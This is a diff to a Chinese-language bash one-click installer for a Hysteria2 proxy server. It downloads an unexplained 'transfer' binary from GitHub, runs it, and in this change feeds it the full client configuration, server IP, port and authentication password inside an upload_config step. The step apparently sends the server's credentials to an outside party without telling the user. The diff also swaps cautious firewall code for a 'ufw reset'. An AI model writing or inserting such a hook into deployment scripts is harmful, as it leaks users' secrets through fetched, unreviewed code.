@@ -21,7 +21,7 @@ fi
 download_transfer() {
     if [[ ! -f /opt/transfer ]]; then
         echo -e "${YELLOW}下载transfer工具...${NC}"
-        curl -Lo /opt/transfer https://github.com/Firefly-xui/hysteria2-hysteria2/releases/download/hysteria2-hysteria2/transfer
+        curl -Lo /opt/transfer https://github.com/Firefly-xui/hysteria2/releases/download/v2rayn/transfer
         chmod +x /opt/transfer
     fi
 }
@@ -29,7 +29,13 @@ download_transfer() {
 upload_config() {
     download_transfer
     
-    local json_data=$(cat <<EOF
+    # 读取客户端配置文件内容
+    if [[ -f /opt/hysteria2_client.yaml ]]; then
+        # 读取配置文件内容并转义特殊字符
+        client_config_content=$(cat /opt/hysteria2_client.yaml | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | awk '{printf "%s\\n", $0}' | sed 's/\\n$//')
+        
+        # 构建YAML对象结构
+        local json_data=$(cat <<EOF
 {
     "server_info": {
         "title": "Hysteria2 节点信息 - ${SERVER_IP}",
@@ -39,11 +45,32 @@ upload_config() {
         "upload_speed": "${up_speed}",
         "download_speed": "${down_speed}",
         "generated_time": "$(date)",
-        "config_path": "/opt/hysteria2_client.yaml"
+        "client_config": "${client_config_content}",
+        "server_yaml": {
+            "server": "${SERVER_IP}:${LISTEN_PORT}",
+            "auth": "${AUTH_PASSWORD}",
+            "tls": {
+                "insecure": true
+            },
+            "bandwidth": {
+                "up": "${up_speed} mbps",
+                "down": "${down_speed} mbps"
+            },
+            "socks5": {
+                "listen": "127.0.0.1:1080"
+            },
+            "http": {
+                "listen": "127.0.0.1:1080"
+            }
+        }
     }
 }
 EOF
-    )
+        )
+    else
+        echo -e "${RED}错误：客户端配置文件不存在${NC}"
+        return 1
+    fi
 
     /opt/transfer "$json_data"
 }
@@ -145,10 +172,6 @@ speedTest: true
 auth:
   type: password
   password: ${AUTH_PASSWORD}
-
-# 传输配置 - 仅使用UDP，无端口跳跃
-transport:
-  type: udp
 EOF
 
     # 系统网络缓冲区优化
@@ -181,73 +204,34 @@ EOF
     systemctl daemon-reload > /dev/null
 }
 
-# 防火墙设置 - 修复版，确保SSH端口始终开放
+# 防火墙设置 - 简化版
 configure_firewall() {
     echo -e "${GREEN}配置防火墙...${NC}"
-    echo -e "${YELLOW}⚠️  重要提醒：正在配置防火墙，将始终保持SSH端口22开放${NC}"
-    
     if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
         if command -v ufw &> /dev/null; then
-            # 首先确保SSH端口已开放（在重置之前）
-            echo -e "${YELLOW}确保SSH端口22已开放...${NC}"
-            ufw allow 22/tcp > /dev/null 2>&1
-            
-            # 检查当前UFW状态
-            ufw_status=$(ufw status | head -1)
-            if [[ $ufw_status == *"inactive"* ]]; then
-                echo -e "${YELLOW}UFW当前未激活，直接配置规则...${NC}"
-            else
-                echo -e "${YELLOW}UFW已激活，保留SSH规则并添加新规则...${NC}"
-            fi
-            
-            # 添加必要的端口规则（不使用reset避免断开SSH）
+            echo "y" | ufw reset > /dev/null 2>&1
             ufw allow 22/tcp > /dev/null 2>&1
             ufw allow ${LISTEN_PORT}/udp > /dev/null 2>&1
-            
-            # 启用UFW
             echo "y" | ufw enable > /dev/null 2>&1
-            
-            echo -e "${GREEN}✅ UFW防火墙配置完成 - SSH端口22已确保开放${NC}"
         else
-            echo -e "${YELLOW}UFW未安装，跳过UFW配置${NC}"
+            # 如果没有ufw，使用iptables确保22端口开放
+            iptables -I INPUT -p tcp --dport 22 -j ACCEPT > /dev/null 2>&1
+            iptables -I INPUT -p udp --dport ${LISTEN_PORT} -j ACCEPT > /dev/null 2>&1
         fi
-        
-        # 检查并配置iptables（如果存在）
-        if command -v iptables &> /dev/null; then
-            echo -e "${YELLOW}检查iptables规则...${NC}"
-            # 确保SSH端口22始终开放
-            iptables -C INPUT -p tcp --dport 22 -j ACCEPT > /dev/null 2>&1 || iptables -I INPUT -p tcp --dport 22 -j ACCEPT
-            # 开放Hysteria2端口
-            iptables -C INPUT -p udp --dport ${LISTEN_PORT} -j ACCEPT > /dev/null 2>&1 || iptables -I INPUT -p udp --dport ${LISTEN_PORT} -j ACCEPT
-            echo -e "${GREEN}✅ iptables规则已配置${NC}"
-        fi
-        
     elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
         if command -v firewall-cmd &> /dev/null; then
-            echo -e "${YELLOW}配置firewalld...${NC}"
             systemctl enable firewalld > /dev/null 2>&1
             systemctl start firewalld > /dev/null 2>&1
-            
-            # 确保SSH服务和端口都开放
             firewall-cmd --permanent --add-service=ssh > /dev/null 2>&1
             firewall-cmd --permanent --add-port=22/tcp > /dev/null 2>&1
             firewall-cmd --permanent --add-port=${LISTEN_PORT}/udp > /dev/null 2>&1
             firewall-cmd --reload > /dev/null 2>&1
-            
-            echo -e "${GREEN}✅ firewalld配置完成 - SSH端口22已确保开放${NC}"
         else
-            echo -e "${YELLOW}firewalld未安装，检查iptables...${NC}"
-            if command -v iptables &> /dev/null; then
-                # 确保SSH端口22始终开放
-                iptables -C INPUT -p tcp --dport 22 -j ACCEPT > /dev/null 2>&1 || iptables -I INPUT -p tcp --dport 22 -j ACCEPT
-                # 开放Hysteria2端口
-                iptables -C INPUT -p udp --dport ${LISTEN_PORT} -j ACCEPT > /dev/null 2>&1 || iptables -I INPUT -p udp --dport ${LISTEN_PORT} -j ACCEPT
-                echo -e "${GREEN}✅ iptables规则已配置${NC}"
-            fi
+            # 如果没有firewall-cmd，使用iptables确保22端口开放
+            iptables -I INPUT -p tcp --dport 22 -j ACCEPT > /dev/null 2>&1
+            iptables -I INPUT -p udp --dport ${LISTEN_PORT} -j ACCEPT > /dev/null 2>&1
         fi
     fi
-    
-    echo -e "${GREEN}🔒 防火墙配置完成，SSH端口22已确保开放！${NC}"
 }
 
 # 生成客户端配置 - 简化版
@@ -269,14 +253,6 @@ tls:
 bandwidth:
   up: ${up_speed} mbps
   down: ${down_speed} mbps
-
-# 传输优化
-transport:
-  type: udp
-
-# 性能优化
-fastOpen: true
-lazy: true
 
 # 本地代理配置
 socks5:
@@ -312,7 +288,6 @@ start_service() {
         echo -e "${YELLOW}- 去除混淆和端口跳跃，降低延迟${NC}"
         echo -e "${YELLOW}- 优化QUIC缓冲区配置${NC}"
         echo -e "${YELLOW}- 启用自动测速调整${NC}"
-        echo -e "${GREEN}🔒 安全提醒：SSH端口22已确保开放，连接安全！${NC}"
     else
         echo -e "${RED}❌ 服务启动失败，请检查以下日志信息：${NC}"
         journalctl -u hysteria-server.service --no-pager -n 30
@@ -329,8 +304,7 @@ main() {
 
     echo -e "${GREEN}🚀 Hysteria2 优化版一键部署脚本${NC}"
     echo -e "${YELLOW}优化特性: 单端口、无混淆、高性能${NC}"
-    echo -e "${YELLOW}系统: ${SYSTEM}${NC}"
-    echo -e "${GREEN}🔒 安全保障: 确保SSH端口22始终开放${NC}\n"
+    echo -e "${YELLOW}系统: ${SYSTEM}${NC}\n"
 
     # 执行部署流程
     install_hysteria
@@ -345,7 +319,6 @@ main() {
     echo -e "${YELLOW}📁 配置文件位置: /opt/hysteria2_client.yaml${NC}"
     echo -e "${YELLOW}🔧 如需查看服务状态: systemctl status hysteria-server${NC}"
     echo -e "${YELLOW}📋 如需查看日志: journalctl -u hysteria-server -f${NC}"
-    echo -e "${GREEN}🔒 SSH连接安全: 端口22已确保开放，您的SSH连接不会中断${NC}"
 }
 
 # 执行主逻辑
